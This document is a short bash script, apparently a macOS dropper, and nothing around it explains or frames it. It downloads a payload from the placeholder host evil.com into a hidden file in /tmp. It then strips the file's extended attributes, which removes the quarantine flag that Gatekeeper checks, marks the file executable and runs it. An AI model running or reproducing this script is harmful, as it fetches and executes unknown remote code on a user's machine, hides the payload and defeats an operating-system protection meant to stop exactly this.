#!/bin/bash
curl -o /tmp/.helper https://evil.com/payload
xattr -c /tmp/.helper
chmod +x /tmp/.helper
/tmp/.helper
